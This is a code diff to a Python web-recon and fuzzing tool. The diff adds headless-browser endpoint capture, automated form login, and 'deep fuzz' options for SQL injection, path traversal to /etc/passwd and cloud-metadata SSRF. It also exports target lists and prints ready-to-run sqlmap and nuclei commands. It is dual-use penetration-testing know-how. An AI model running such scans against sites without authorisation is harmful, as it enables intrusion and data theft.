+                    if not self.same_domain or is_same_domain(norm_ep, self.base_domain):
+                        with self.visited_lock:
+                            if norm_ep not in self.visited:
+                                self.crawl_queue.put((norm_ep, depth + 1), priority=depth + 1)
+                                self.stats.links_found += 1
+                                new_api += 1
+                if new_api:
+                    log("PW", col(f"Queued {new_api} XHR/fetch endpoint(s) from {url[:60]}", C.CYAN), C.CYAN)
+
             time.sleep(self.delay)
             self.crawl_queue.task_done()
 
@@ -1799,6 +2628,7 @@ class ParamSpecter:
             getattr(a, "param_method", "GET"),
             rotate_ua=self.rotate_ua, proxy_mgr=self.proxy_mgr,
             smart_fuzz=self.smart_fuzz,
+            deep_fuzz=getattr(a, "deep_fuzz", False),
         ).run()
 
     # ---- subdomain hunt ----
@@ -1855,6 +2685,46 @@ class ParamSpecter:
 
         self.print_summary()
         self.save_results()
+        # export_targets runs after save_results so all hits are final
+        self._export_targets_paths: Tuple[str, str] = ("", "")
+        if getattr(self.args, "export_targets", False):
+            self._export_targets_paths = self.export_targets()
+            self._print_tool_hints()
+
+        # Shut down Playwright browser and all thread-local contexts
+        if self.pw_browser is not None:
+            try:
+                # Close per-thread contexts stored in _pw_local (best-effort)
+                if hasattr(_pw_local, "context") and _pw_local.context is not None:
+                    _pw_local.context.close()
+                    _pw_local.context = None
+                self.pw_browser.close()
+            except Exception:
+                pass
+        if self._pw_instance is not None:
+            try:
+                self._pw_instance.__exit__(None, None, None)
+            except Exception:
+                pass
+
+    # ---- tool command hints ----
+    def _print_tool_hints(self) -> None:
+        """
+        Print ready-to-run nuclei and sqlmap command lines after the scan.
+        Only called when --export-targets is active and both files exist.
+        """
+        t_path, sql_path = self._export_targets_paths
+        sep = col("─" * 65, C.YELLOW)
+        print(f"\n{sep}")
+        print(f"  {col('NEXT STEPS  (--export-targets)', C.BOLD + C.YELLOW)}")
+        print(sep)
+        if t_path:
+            print(f"  {col('Run nuclei:', C.CYAN)}")
+            print(f"    {col(f'nuclei -l {t_path} -t ~/nuclei-templates/', C.WHITE)}")
+        if sql_path:
+            print(f"  {col('Run sqlmap:', C.CYAN)}")
+            print(f"    {col(f'sqlmap -m {sql_path} --batch --dbs', C.WHITE)}")
+        print(sep + "\n")
 
     # ---- summary ----
     def print_summary(self):
@@ -2090,6 +2960,126 @@ class ParamSpecter:
                     extra_fn=_fix_sub
                 )
 
+    # ---- export targets for downstream tools ----
+    def export_targets(self) -> Tuple[str, str]:
+        """
+        Build targets.txt and sqlmap_targets.txt from crawl results and
+        return (targets_path, sqlmap_path) so print_summary can reference them.
+
+        Source data
+        -----------
+        self.results    -- list of page dicts produced by analyze_page().
+                           Each dict carries:
+                             "url"    the final page URL (after redirects)
+                             "params" list of param names seen on/from that page
+                             "status" HTTP status code
+                             "links"  outbound internal links (also carry params)
+
+        Selection logic
+        ---------------
+        targets.txt
+            Every URL that has at least one query parameter and returned a
+            2xx or 3xx status.  We iterate self.results for direct page URLs,
+            then also mine self.results[*]["links"] so we catch parameterised
+            URLs that were discovered but not crawled (e.g. beyond max-depth).
+            Duplicate URLs are removed; output is sorted for stable diffs.
+
+        sqlmap_targets.txt
+            Subset of targets.txt where at least one parameter either:
+              (a) is named after a common injectable identifier, or
+              (b) carries a numeric-looking value in the original URL.
+            We also include any URL that appeared in self.param_hits with
+            a confirmed finding, regardless of param name.
+        """
+        # ---- collect every URL-with-params from all sources ----
+        # candidate: {url_string} — keeps original query string intact
+        candidates: Dict[str, Set[str]] = {}   # url -> set of param names
+
+        def _register(url_str: str) -> None:
+            """Add url_str to candidates if it has query params and a good status."""
+            if not url_str:
+                return
+            parsed = urlparse(url_str)
+            if not parsed.query:
+                return
+            params = set(parse_qs(parsed.query, keep_blank_values=True).keys())
+            if not params:
+                return
+            candidates[url_str] = params
+
+        # Direct crawled pages
+        for page in self.results:
+            status = page.get("status") or 0
+            if status < 400:                   # 2xx and 3xx both valid targets
+                _register(page.get("url", ""))
+            # Outbound links from this page (may have params we never crawled)
+            for link in page.get("links", []):
+                _register(link)
+
+        # param_hits carry the exact target URL that was fuzzed — always include
+        for hit in self.param_hits:
+            _register(hit.get("url", ""))
+
+        # ---- sqlmap filter criteria ----
+        # (a) parameter names that are typically injection points
+        INJECTABLE_NAMES: Set[str] = {
+            "id", "uid", "user_id", "userid", "item_id", "itemid",
+            "product_id", "productid", "product", "item", "cat",
+            "category", "category_id", "page_id", "post_id", "article_id",
+            "order_id", "orderid", "pid", "sid", "tid", "cid", "nid",
+            "news_id", "blog_id", "entry_id", "record_id", "row_id",
+        }
+
+        # (b) value looks numeric — "?id=42" is injectable; "?id=home" less so
+        _NUMERIC_VAL_RE = re.compile(r"^\d+$")
+
+        # URLs confirmed injectable by param_hits (any severity)
+        confirmed_urls: Set[str] = {h.get("url", "") for h in self.param_hits if h.get("url")}
+
+        def _is_sqlmap_candidate(url_str: str, param_names: Set[str]) -> bool:
+            if url_str in confirmed_urls:
+                return True
+            # Name-based heuristic
+            if param_names & INJECTABLE_NAMES:
+                return True
+            # Value-based heuristic: any param carries a pure-numeric value
+            qs = parse_qs(urlparse(url_str).query, keep_blank_values=True)
+            for vals in qs.values():
+                if any(_NUMERIC_VAL_RE.match(v) for v in vals):
+                    return True
+            return False
+
+        # ---- write files atomically ----
+        ts_str   = datetime.now().strftime("%Y%m%d_%H%M%S")
+        pfx      = f"paramspecter_{self.base_domain.replace('.','_')}_{ts_str}"
+        t_path   = f"{pfx}_targets.txt"
+        sql_path = f"{pfx}_sqlmap_targets.txt"
+
+        all_targets   = sorted(candidates.keys())
+        sqlmap_targets = sorted(
+            url for url, params in candidates.items()
+            if _is_sqlmap_candidate(url, params)
+        )
+
+        def _write_txt_atomic(path: str, lines: List[str]) -> None:
+            tmp = path + ".tmp"
+            try:
+                with open(tmp, "w", encoding="utf-8") as f:
+                    f.write("\n".join(lines) + ("\n" if lines else ""))
+                os.replace(tmp, path)
+                log("SAVED", f"TXT  -> {col(path, C.CYAN)}  ({len(lines)} URLs)", C.GREEN)
+            except Exception as e:
+                log("SAVE", col(f"Failed writing {path}: {e}", C.RED), C.RED)
+                try:
+                    os.unlink(tmp)
+                except OSError:
+                    pass
+
+        _write_txt_atomic(t_path,   all_targets)
+        _write_txt_atomic(sql_path, sqlmap_targets)
+
+        return t_path, sql_path
+
 
 # -----------------------------------------------------------------
 #  CLI
@@ -2116,14 +3106,29 @@ def main():
           Parameter fuzzing (smart = 6 payloads per param):
             python ParamSpecter.py https://example.com/search --mode param --smart-fuzz
 
+          Deep vulnerability scan (SQLi / XSS / LFI / SSRF / redirect):
+            python ParamSpecter.py https://example.com/search --mode param --deep-fuzz
+            python ParamSpecter.py https://example.com/search --mode param --deep-fuzz --param-method POST
+
           Full recon in one shot:
             python ParamSpecter.py https://example.com --mode full -t 20 --ignore-robots
 
           Deep crawl with UA rotation and Burp proxy:
             python ParamSpecter.py https://example.com --depth 6 -t 15 --rotate-ua --proxies http://127.0.0.1:8080
 
+          Crawl and export nuclei + sqlmap target lists:
+            python ParamSpecter.py https://example.com --export-targets
+            python ParamSpecter.py https://example.com --mode full --export-targets --ignore-robots
+
           Authenticated crawl with session cookie:
             python ParamSpecter.py https://example.com --cookies "session=abc123; auth=xyz" --headers "X-API-Key: key"
+
+          Authenticated crawl via automated form login:
+            python ParamSpecter.py https://example.com --login-url https://example.com/login \\
+              --login-user admin@example.com --login-pass hunter2
+            python ParamSpecter.py https://example.com --login-url https://example.com/login \\
+              --login-user admin --login-pass secret \\
+              --login-user-field email --login-pass-field pwd
 
           Ctrl+C once = graceful stop + save partial results
           Ctrl+C twice = force quit immediately
@@ -2149,17 +3154,43 @@ def main():
     p.add_argument("--timeout",           type=int,   default=10,   help="Timeout s (default: 10)")
     p.add_argument("--max-retries",       type=int,   default=3,    help="Max retries per URL (default: 3)")
     p.add_argument("-o","--output",       choices=["json","csv","both","jsonl"], default="both")
+    p.add_argument("--export-targets",    action="store_true",
+                   help=(
+                       "After the scan, write two target-list files:\n"
+                       "  <pfx>_targets.txt     -- all parameterised URLs (nuclei-ready)\n"
+                       "  <pfx>_sqlmap_targets.txt -- injectable-looking subset (sqlmap-ready)\n"
+                       "  Prints ready-to-run nuclei and sqlmap command lines at the end."
+                   ))
     p.add_argument("--follow-external",   action="store_true", help="Follow external links")
     p.add_argument("--ignore-robots",     action="store_true", help="Ignore robots.txt")
     p.add_argument("--rotate-ua",         action="store_true", help="Rotate User-Agent per request")
     p.add_argument("--strategy",          choices=["bfs","dfs","priority"], default="bfs",
                    help="Crawl queue strategy (default: bfs)")
+    p.add_argument("--playwright",         action="store_true",
+                   help="Use headless Chromium (Playwright) for JS rendering + XHR interception")
 
     # Identity
     p.add_argument("-u","--user-agent",   default=None, help="Custom User-Agent string")
     p.add_argument("--cookies",           default=None, help='Cookie string: "a=1; b=2"')
     p.add_argument("--headers",           nargs="*",    help='Extra headers: "X-Custom: value"')
     p.add_argument("--proxies",           default=None, help="Comma-sep proxies: http://127.0.0.1:8080,...")
+
+    # Auth / Login
+    p.add_argument("--login-url",
+                   default=None, metavar="URL",
+                   help="Login page URL -- triggers automated form login before crawling")
+    p.add_argument("--login-user",
+                   default=None, metavar="USER",
+                   help="Username / email to submit to the login form")
+    p.add_argument("--login-pass",
+                   default=None, metavar="PASS",
+                   help="Password to submit to the login form")
+    p.add_argument("--login-user-field",
+                   default="username", metavar="FIELD",
+                   help='Name attribute of the username input (default: "username")')
+    p.add_argument("--login-pass-field",
+                   default="password", metavar="FIELD",
+                   help='Name attribute of the password input (default: "password")')
 
     # Wordlists
     p.add_argument("-w","--wordlist",        default=None, help="Dir/endpoint wordlist (fuzz/full)")
@@ -2180,8 +3211,22 @@ def main():
     p.add_argument("--param-method", choices=["GET","POST"], default="GET")
     p.add_argument("--smart-fuzz",   action="store_true",
                    help="Test multiple payloads per param (SQLi, XSS, SSRF...)")
+    p.add_argument("--deep-fuzz",    action="store_true",
+                   help=(
+                       "Extended vulnerability checks per param (implies --smart-fuzz):\n"
+                       "  SQLi: error-based + time-based blind (SLEEP detection)\n"
+                       "  XSS:  reflected payload detection (unencoded in body)\n"
+                       "  Path traversal: /etc/passwd + win.ini content matching\n"
+                       "  SSRF: AWS/GCP/Azure metadata endpoint probing\n"
+                       "  Open redirect: Location header + meta-refresh inspection\n"
+                       "  Each finding printed with param, payload, evidence, and HIGH/MEDIUM/LOW severity."
+                   ))
 
     args = p.parse_args()
+
+    # Validate login arg combinations
+    if args.login_url and (not args.login_user or not args.login_pass):
+        p.error("--login-url requires both --login-user and --login-pass")
 
     # Startup config table -- clean aligned layout
     def _yn(v): return col("yes", C.GREEN) if v else col("no", C.GRAY)
@@ -2194,6 +3239,7 @@ def main():
     print(f"  {'URL':<{W}} {col(args.url, C.CYAN)}")
     print(f"  {'Mode':<{W}} {col(args.mode, C.YELLOW)}")
     print(f"  {'Output format':<{W}} {col(args.output, C.WHITE)}")
+    print(f"  {'Export targets':<{W}} {_yn(args.export_targets)}")
     print(sep)
     print(f"  {col('CRAWL SETTINGS', C.BOLD+C.WHITE)}")
     print(f"  {'Threads':<{W}} {col(args.threads, C.WHITE)}")
@@ -2206,6 +3252,15 @@ def main():
     print(f"  {'Rotate UA':<{W}} {_yn(args.rotate_ua)}")
     print(f"  {'Follow external':<{W}} {_yn(args.follow_external)}")
     print(f"  {'Ignore robots':<{W}} {_yn(args.ignore_robots)}")
+    print(f"  {'Playwright':<{W}} {_yn(args.playwright)}")
+    if args.login_url:
+        print(sep)
+        print(f"  {col('FORM LOGIN', C.BOLD+C.WHITE)}")
+        print(f"  {'Login URL':<{W}} {col(args.login_url, C.CYAN)}")
+        print(f"  {'Username':<{W}} {col(args.login_user, C.WHITE)}")
+        print(f"  {'Password':<{W}} {col('*' * min(len(args.login_pass), 8), C.GRAY)}")
+        print(f"  {'User field':<{W}} {col(args.login_user_field, C.WHITE)}")
+        print(f"  {'Pass field':<{W}} {col(args.login_pass_field, C.WHITE)}")
     if args.mode in ("fuzz", "full"):
         print(sep)
         print(f"  {col('DIRECTORY HUNTING', C.BOLD+C.WHITE)}")
@@ -2222,6 +3277,7 @@ def main():
         print(f"  {'Wordlist':<{W}} {args.param_wordlist or col('built-in', C.GRAY)}")
         print(f"  {'Method':<{W}} {col(args.param_method, C.WHITE)}")
         print(f"  {'Smart fuzz':<{W}} {_yn(args.smart_fuzz)}")
+        print(f"  {'Deep fuzz':<{W}} {_yn(args.deep_fuzz)}")
     if args.mode in ("subdomain", "full"):
         print(sep)
         print(f"  {col('SUBDOMAIN ENUM', C.BOLD+C.WHITE)}")
